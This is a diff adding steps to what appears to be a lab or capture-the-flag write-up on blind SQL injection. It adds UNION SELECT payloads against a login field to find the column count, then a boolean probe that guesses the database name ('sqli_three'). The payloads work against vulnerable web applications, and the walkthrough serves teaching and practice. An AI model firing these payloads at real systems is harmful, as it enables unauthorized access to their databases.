@@ -81,3 +81,11 @@ We get all the columns name of `stuff_users` table
     admin123' UNION SELECT 1;-- 
 ![incorrent column](images/18-incorrect-column.png)<br/>
 As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns.<br/>
+
+    admin123' UNION SELECT 1,2,3;-- 
+![Column error fixed](images/19-column-error-fixed.png)<br/>
+Now that our number of columns has been established, we can work on the  enumeration of the database.<br/>
+
+    admin123' UNION SELECT 1,2,3 where database() like 's%';-- 
+![Get db name](images/20-get-database-name.png)<br/>
+After many tryed i've found full database name, which is `sqli_three`<br/>
